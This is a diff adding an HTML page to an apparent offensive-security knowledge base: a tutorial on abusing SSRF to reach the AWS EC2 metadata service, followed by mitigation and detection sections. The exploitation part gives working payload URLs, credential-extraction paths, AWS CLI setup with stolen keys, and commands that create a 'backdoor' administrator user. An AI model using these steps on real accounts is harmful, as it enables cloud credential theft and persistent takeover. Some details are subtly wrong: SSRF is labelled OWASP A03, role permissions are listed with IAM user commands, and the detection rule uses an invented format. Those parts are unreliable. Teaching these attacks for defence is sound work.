@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSRF to AWS Metadata | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../web/index.html">Web Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="../web/index.html">Web Security</a> / SSRF AWS
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | CWE-918</span>
+      <h1>☁️ SSRF to AWS Metadata Compromise</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>CWE</strong><span>CWE-918</span></div>
+        <div class="meta-item"><strong>OWASP</strong><span>A03:2021</span></div>
+        <div class="meta-item"><strong>CVSS</strong><span>10.0 (Critical)</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>AWS EC2</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Server-Side Request Forgery (SSRF) combined with AWS EC2 metadata service allows attackers to extract cloud credentials, escalate privileges, and fully compromise the cloud environment.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why This is Critical:</strong>
+        <ul>
+          <li><strong>No Authentication Required:</strong> Metadata endpoint is accessible from within the instance</li>
+          <li><strong>IAM Credentials:</strong> Temporary credentials for attached IAM roles</li>
+          <li><strong>Privilege Escalation:</strong> Role privileges determine access to cloud resources</li>
+          <li><strong>Cross-Account:</strong> Sometimes roles can access other accounts</li>
+          <li><strong>Persistent Access:</strong> Even after initial foothold is closed</li>
+        </ul>
+      </div>
+
+      <p><strong>Attack Flow:</strong></p>
+      <ol>
+        <li>Find SSRF vulnerability in web application</li>
+        <li>Request AWS metadata service at 169.254.169.254</li>
+        <li>Extract IAM credentials from metadata</li>
+        <li>Configure AWS CLI with extracted credentials</li>
+        <li>Enumerate permissions and escalate privileges</li>
+        <li>Access S3 buckets, Lambda functions, or other services</li>
+        <li>Exfiltrate data or establish persistent access</li>
+      </ol>
+    </div>
+
+    <!-- 2. AWS METADATA -->
+    <div class="content-section" id="metadata">
+      <h2>📡 AWS Metadata Service</h2>
+      
+      <p><strong>Metadata Endpoints:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># IMDSv1 (old, used in this attack)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+
+# IMDSv2 (newer, requires token)
+http://169.254.169.254/latest/api/token</pre>
+      </div>
+
+      <p><strong>Key Endpoints to Query:</strong></p>
+      <ul>
+        <li><code>/latest/meta-data/iam/security-credentials/</code> - List credential names</li>
+        <li><code>/latest/meta-data/iam/security-credentials/[ROLE_NAME]</code> - Get credentials</li>
+        <li><code>/latest/meta-data/instance-id</code> - EC2 instance ID</li>
+        <li><code>/latest/meta-data/ami-id</code> - AMI ID</li>
+        <li><code>/latest/meta-data/instance-type</code> - Instance type</li>
+        <li><code>/latest/user-data/</code> - User data (often contains secrets)</li>
+      </ul>
+    </div>
+
+    <!-- 3. EXPLOITATION -->
+    <div class="content-section" id="exploitation">
+      <h2>💣 Exploitation</h2>
+      
+      <p><strong>Step 1: Basic Metadata Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># In vulnerable URL parameter
+http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
+
+# Using curl
+curl http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/</pre>
+      </div>
+
+      <p><strong>Step 2: Get IAM Role Name:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get security credentials path
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Response:
+# EC2InstanceRole
+# LambdaExecutionRole
+# S3FullAccessRole</pre>
+      </div>
+
+      <p><strong>Step 3: Extract Credentials:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get credentials for EC2InstanceRole
+http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole
+
+# Response (JSON):
+{
+  "AccessKeyId": "ASIAXXXXXXXXXX",
+  "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxx",
+  "Token": "xxxxxxxxxxxxxx...",
+  "Expiration": "2024-01-15T12:34:56Z"
+}</pre>
+      </div>
+
+      <p><strong>Step 4: Configure AWS CLI:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Configure temporary credentials
+aws configure set aws_access_key_id ASIAXXXXXXXXXX
+aws configure set aws_secret_access_key xxxxxxxxxxxxxxxxxxxx
+aws configure set aws_session_token xxxxxxxxxxxxxx...
+
+# Or use environment variables
+export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXX
+export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxx
+export AWS_SESSION_TOKEN=xxxxxxxxxxxxx...
+
+# Verify access
+aws sts get-caller-identity</pre>
+      </div>
+    </div>
+
+    <!-- 4. PRIVILEGE ESCALATION -->
+    <div class="content-section" id="privesc">
+      <h2>🔓 Cloud Privilege Escalation</h2>
+      
+      <p><strong>Enumerate Permissions:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get current identity
+aws sts get-caller-identity
+
+# List all attached policies
+aws iam list-attached-user-policies --user-name EC2InstanceRole
+
+# Get inline policies
+aws iam list-user-policies --user-name EC2InstanceRole
+
+# Check specific services
+aws ec2 describe-instances
+aws s3 ls
+aws lambda list-functions</pre>
+      </div>
+
+      <p><strong>Privilege Escalation Techniques:</strong></p>
+      <ul>
+        <li><strong>Lambda + CloudWatch:</strong> Modify Lambda to capture credentials</li>
+        <li><strong>S3 Bucket Access:</strong> Read sensitive data from buckets</li>
+        <li><strong>SSM Parameter Store:</strong> Access stored secrets</li>
+        <li><strong>PassRole + Lambda:</strong> Execute code with additional permissions</li>
+        <li><strong>Create New Users:</strong> Add persistent access</li>
+      </ul>
+
+      <p><strong>Add Backdoor User:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create access key for persistence
+aws iam create-user --user-name backdoor
+aws iam create-access-key --user-name backdoor
+aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</pre>
+      </div>
+    </div>
+
+    <!-- 5. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact Analysis</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>Data Breach:</strong> Access all S3 buckets, databases, secrets</li>
+          <li><strong>Cryptojacking:</strong> Spin up EC2 instances for crypto mining</li>
+          <li><strong>Persistence:</strong> Create new users/roles for long-term access</li>
+          <li><strong>Lateral Movement:</strong> Access other AWS services</li>
+          <li><strong>Financial Impact:</strong> Large AWS bills from resource abuse</li>
+        </ul>
+      </div>
+
+      <p><strong>Real-World Example:</strong></p>
+      <ul>
+        <li>Company's web app has SSRF vulnerability</li>
+        <li>EC2 instance has IAM role with S3FullAccess</li>
+        <li>Attacker extracts credentials and downloads all S3 data</li>
+        <li>Customer PII, financial records, credentials exposed</li>
+        <li>Regulatory fines, reputational damage</li>
+      </ul>
+    </div>
+
+    <!-- 6. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Application-Level:</strong>
+        <ul>
+          <li><strong>Input Validation:</strong> Whitelist allowed URLs, block internal ranges</li>
+          <li><strong>URL Parsing:</strong> Use secure URL parsing libraries</li>
+          <li><strong>Network Segmentation:</strong> Block 169.254.169.254 at firewall</li>
+          <li><strong>IMDSv2:</strong> Require tokens for metadata access</li>
+        </ul>
+      </div>
+
+      <p><strong>IMDSv2 Enablement:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Require IMDSv2 for new instances
+aws ec2 modify-instance-metadata-options \
+    --instance-id i-1234567890abcdef0 \
+    --http-tokens required \
+    --http-put-response-hop-limit 1
+
+# Or in CloudFormation
+Resources:
+  Ec2Instance:
+    Type: AWS::EC2::Instance
+    Properties:
+      MetadataOptions:
+        HttpTokens: required</pre>
+      </div>
+
+      <p><strong>NACL Rules to Block Metadata:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Block outbound access to metadata
+aws ec2 create-network-acl-entry \
+    --network-acl-id acl-xxx \
+    --egress true \
+    --rule-number 100 \
+    --protocol tcp \
+    --destination-block 169.254.169.254/32 \
+    --port-range From=80,To=80 \
+    --rule-action deny</pre>
+      </div>
+    </div>
+
+    <!-- 7. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>CloudWatch Detection Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>{
+  "ruleName": "SSRF Metadata Access",
+  "eventPattern": {
+    "source": ["aws.ec2"],
+    "detail-type": ["AWS API Call via CloudTrail"],
+    "detail": {
+      "eventSource": ["ec2.amazonaws.com"],
+      "eventName": ["DescribeInstances"],
+      "userAgent": ["aws-cli/"]
+    }
+  },
+  "action": {
+    "type": "sns"
+  },
+  "threshold": 10
+}</pre>
+      </div>
+
+      <p><strong>GuardDuty Finding:</strong></p>
+      <ul>
+        <li>Unusual instance calling metadata service</li>
+        <li>High volume of DescribeInstances calls</li>
+        <li>Instance accessing services it hasn't accessed before</li>
+      </ul>
+    </div>
+
+    <!-- 8. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/" target="_blank">OWASP SSRF</a></li>
+        <li><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank">AWS IMDS</a></li>
+        <li><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation/" target="_blank">AWS Privilege Escalation</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank">SSRF Payloads</a></li>
+      </ul>
+    </div>
+
+    <a href="../web/ssrf.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to SSRF</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
